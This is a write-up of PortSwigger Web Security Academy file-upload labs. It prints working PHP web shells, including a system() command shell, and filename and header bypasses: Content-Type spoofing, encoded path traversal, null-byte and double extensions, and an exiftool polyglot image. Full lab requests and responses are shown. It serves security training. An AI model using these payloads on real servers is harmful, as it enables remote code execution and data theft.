---
title: PortSwigger - File upload Vulnerabilities
date: '2024-03-04'
tags: ['PortSwigger', 'PortSwigger Labs', 'Web Security']
draft: false
summary: 
---

## File Upload Vulnerabilities
File upload vulnerabilities occur when web servers fail to validate
- File name
- size
- contents
- type or extension

If the server is not validating all of the above things , it can lead to remote code execution or overwriting of existing files as well.
#### Remote code execution via web shell upload
It could be possible that we are able to upload scripts on web server but the server is configured to not execute any file. In that case achieving remote code execution can be difficult.

In the current lab we upload profile picture from the account and we observe the following request is made on refresh to get the picture we just uploaded :

```http
GET /files/avatars/picturename.png HTTP/1.1
Host: 0a4500e703f9730a84b4867f003100ad.web-security-academy.net
Cookie: session=53U0cVadwR2zk98LnhlWHd1cYtTT6OF6
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a4500e703f9730a84b4867f003100ad.web-security-academy.net/my-account
Sec-Fetch-Dest: image
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: same-origin
Priority: u=5, i
Te: trailers
Connection: keep-alive
```

We make a `exploit.php` with the following script :

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

This lead to the following request:

```http
GET /files/avatars/exploit.php HTTP/1.1
Host: 0a4500e703f9730a84b4867f003100ad.web-security-academy.net
Cookie: session=53U0cVadwR2zk98LnhlWHd1cYtTT6OF6
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a4500e703f9730a84b4867f003100ad.web-security-academy.net/my-account
Sec-Fetch-Dest: image
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: same-origin
Priority: u=5, i
Te: trailers
Connection: keep-alive

# Response :

HTTP/1.1 200 OK
Date: Tue, 13 Aug 2024 05:56:06 GMT
Server: Apache/2.4.41 (Ubuntu)
Keep-Alive: timeout=5, max=100
Connection: close
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 32

Mg7QQZyRONnI8piUh0YKPEFQIi4Rt6bP
```


We were able to fetch the secret. A more versatile web shell may look something like this:

`<?php echo system($_GET['command']); ?>`

This script enables you to pass an arbitrary system command via a query parameter as follows:

`GET /example/exploit.php?command=id HTTP/1.1`



#### Web shell upload via Content-Type restriction bypass

`application/x-www-form-url-encoded` : For sending simple HTML forms
`multipart/form-data` : For sending large data like PDFs and images

In the current lab the file type is being validated solely on the basis of `Content-Type` header. We can bypass this restriction.

We were unable to upload the `php` script like we did in the above lab. So we had to upload the script and change the `Content-Type` header back to `image/jpeg` This allowed us to bypass the restriction

```http
# Original Request body

-----------------------------164166457611644244961394233847
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: text/php

<?php echo file_get_contents('/home/carlos/secret'); ?>
-----------------------------164166457611644244961394233847
Content-Disposition: form-data; name="user"

wiener
-----------------------------164166457611644244961394233847
Content-Disposition: form-data; name="csrf"

leQfCOJuZHpXJv9bIQs5Gf9oryJZe3Ix
-----------------------------164166457611644244961394233847--

# Modified request body


-----------------------------164166457611644244961394233847
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?>
-----------------------------164166457611644244961394233847
Content-Disposition: form-data; name="user"

wiener
-----------------------------164166457611644244961394233847
Content-Disposition: form-data; name="csrf"

leQfCOJuZHpXJv9bIQs5Gf9oryJZe3Ix
-----------------------------164166457611644244961394233847--


# Response from the server on Get request later

HTTP/1.1 200 OK
Date: Tue, 13 Aug 2024 06:09:30 GMT
Server: Apache/2.4.41 (Ubuntu)
Keep-Alive: timeout=5, max=100
Connection: close
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 32

LUMjILiOmSL2Q2vrWNVqPouvoTn2SD2q

```

#### Web shell upload via path traversal
Web servers are configured to only accept certain file types however if we bypass that restriction the second line of defense is where server is configured not to execute scripts. Servers generally only run scripts whose MIME type they have been explicitly configured to execute.

These kinds of restrictions are usually applied on the directories where user controlled input is uploaded. But if we find a directory where server is not expecting any user input based files, we might be able to execute scripts in such directories.

Initial request and response :

```http
GET /files/avatars/exploit.php HTTP/1.1
Host: 0a28009e040de909800f26cf001400fa.web-security-academy.net
Cookie: session=YN31gop1B8LZHC9sVp4dOrbxmgqdexsw
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a28009e040de909800f26cf001400fa.web-security-academy.net/my-account
Sec-Fetch-Dest: image
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: same-origin
Priority: u=5, i
Te: trailers
Connection: keep-alive


HTTP/1.1 200 OK
Date: Tue, 13 Aug 2024 06:21:59 GMT
Server: Apache/2.4.41 (Ubuntu)
Last-Modified: Tue, 13 Aug 2024 06:21:55 GMT
ETag: "37-61f8aa045a340"
Accept-Ranges: bytes
Keep-Alive: timeout=5, max=100
Connection: close
X-Frame-Options: SAMEORIGIN
Content-Length: 55

<?php echo file_get_contents('/home/carlos/secret'); ?>
```


The server is simply returning the contents of the php file instead of executing it.

```http
-----------------------------69546747533144935391453654045
Content-Disposition: form-data; name="avatar"; filename="../exploit.php"
Content-Type: text/php

<?php echo file_get_contents('/home/carlos/secret'); ?>
-----------------------------69546747533144935391453654045
Content-Disposition: form-data; name="user"

wiener
-----------------------------69546747533144935391453654045
Content-Disposition: form-data; name="csrf"

w3B4fp2TcX27MLeZfxQ8lxlpyYmqKqDD
-----------------------------69546747533144935391453654045--

Response:

HTTP/1.1 200 OK
Date: Tue, 13 Aug 2024 06:23:03 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Keep-Alive: timeout=5, max=100
Connection: close
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 132

The file avatars/exploit.php has been uploaded.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
```


This means the server is stripping away the directory traversal payload from the filename. We can try and url encode it.

```http
-----------------------------69546747533144935391453654045
Content-Disposition: form-data; name="avatar"; filename="..%2fexploit.php"
Content-Type: text/php

<?php echo file_get_contents('/home/carlos/secret'); ?>
-----------------------------69546747533144935391453654045
Content-Disposition: form-data; name="user"

wiener
-----------------------------69546747533144935391453654045
Content-Disposition: form-data; name="csrf"

w3B4fp2TcX27MLeZfxQ8lxlpyYmqKqDD
-----------------------------69546747533144935391453654045--


# response from server: 

The file avatars/../exploit.php has been uploaded.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
```

Notice that directory traversal payload is not removed. We simply make a get request to the upload resource now in order to execute it.


```http
GET /files/avatars/../exploit.php HTTP/1.1
Host: 0a28009e040de909800f26cf001400fa.web-security-academy.net
Cookie: session=YN31gop1B8LZHC9sVp4dOrbxmgqdexsw
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a28009e040de909800f26cf001400fa.web-security-academy.net/my-account
Sec-Fetch-Dest: image
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: same-origin
Priority: u=5, i
Te: trailers
Connection: keep-alive

--- 

HTTP/1.1 200 OK
Date: Tue, 13 Aug 2024 06:33:59 GMT
Server: Apache/2.4.41 (Ubuntu)
Keep-Alive: timeout=5, max=100
Connection: close
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 32

z73E03eA1kX2ETP9SPXvuIdm0gL6pSuw
```



#### Web shell upload via obfuscated file extension
We can bypass blacklists by the following methods
- changing filename to `exploit.pHp`
- `exploit.php.jpg`
- `exploit.php.`
- `exploit%2Ephp`
- `exploit.asp;.jpg`
- `exploit.asp%00.jpg`
- `exploit.p.phphp`

```http

-----------------------------218897616138370763250693900
Content-Disposition: form-data; name="avatar"; filename="exploit.php%00.jpg"
Content-Type: text/php

<?php echo file_get_contents('/home/carlos/secret'); ?>
-----------------------------218897616138370763250693900
Content-Disposition: form-data; name="user"

wiener
-----------------------------218897616138370763250693900
Content-Disposition: form-data; name="csrf"

vOC2b4AvQ58NXDAOVIvMJJAONXV7JOL8
-----------------------------218897616138370763250693900--


----

HTTP/1.1 200 OK
Date: Tue, 13 Aug 2024 06:52:41 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Keep-Alive: timeout=5, max=100
Connection: close
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 132

The file avatars/exploit.php has been uploaded.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
```


```http
GET /files/avatars/exploit.php HTTP/1.1
Host: 0a1100fc03680f228334797000d50062.web-security-academy.net
Cookie: session=h5PbMecvESm8kCfrT7enJ2likmXzfBYL
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a1100fc03680f228334797000d50062.web-security-academy.net/my-account
Sec-Fetch-Dest: image
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: same-origin
Priority: u=5, i
Te: trailers
Connection: keep-alive

----

HTTP/1.1 200 OK
Date: Tue, 13 Aug 2024 06:53:45 GMT
Server: Apache/2.4.41 (Ubuntu)
Keep-Alive: timeout=5, max=100
Connection: close
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 32

97sAqyMPR0TCYFMBMoqMPmAVLdPZFsX3
```


#### Remote code execution via polyglot web shell upload
Some web servers verify the contents of file as well, instead of solely relying on content type or file type validations.

In the case of an image upload function, the server might try to verify certain intrinsic properties of an image, such as its dimensions. If you try uploading a PHP script, for example, it won't have any dimensions at all. Therefore, the server can deduce that it can't possibly be an image, and reject the upload accordingly.

Similarly, certain file types may always contain a specific sequence of bytes in their header or footer. These can be used like a fingerprint or signature to determine whether the contents match the expected type. For example, JPEG files always begin with the bytes `FF D8 FF`.

**Solution**: 
Create a polyglot PHP/JPG file that is fundamentally a normal image, but contains your PHP payload in its metadata. A simple way of doing this is to download and run ExifTool from the command line as follows:

```shell
╭─asif@Asifs-Air ~/Downloads
╰─$ exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" test.jpg -o polyglot.php
    1 image files created
```

Getting the file

```http
GET /files/avatars/polyglot.php HTTP/1.1
Host: 0a2700f703e3e3728088be800009006e.web-security-academy.net
Cookie: session=pXNJ0ffiEQEPq80eqGAw5j1zTXSXE3pW
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a2700f703e3e3728088be800009006e.web-security-academy.net/my-account/avatar
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive

HTTP/1.1 200 OK
Date: Tue, 13 Aug 2024 07:07:02 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Keep-Alive: timeout=5, max=100
Connection: close
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 7446
      
(    ¸6curv       Í  sf32     B  Þÿÿó&    ýÿÿû¢ÿÿý£  Ü  Àlÿþ MSTART 5LkwxGEq3XjIpilUm9IihlrAcztTmlML ENDÿÛ 
```

#### Web shell upload via race condition
Modern frameworks are more battle-hardened against these kinds of attacks. They generally don't upload files directly to their intended destination on the filesystem. Instead, they take precautions like uploading to a temporary, sandboxed directory first and randomizing the name to avoid overwriting existing files. They then perform validation on this temporary file and only transfer it to its destination once it is deemed safe to do so.

Developers sometimes implement their own file upload methods , this can introduce race condition vulnerabilities. Forexample consider a scenario where a file is upload on the main filesystem where its checked for viruses , if its malicious the file is removed. All of this happens in milliseconds thats why its hard to find such vulnerabilities.


Due to the generous time window for this race condition, it is possible to solve this lab by manually sending two requests in quick succession using Burp Repeater. The solution described here teaches you a practical approach for exploiting similar vulnerabilities in the wild, where the window may only be a few milliseconds.

To solve this lab we simply send both the `POST` and `GET` request in the repeater. Make them in group. Then send both requests in parallel.
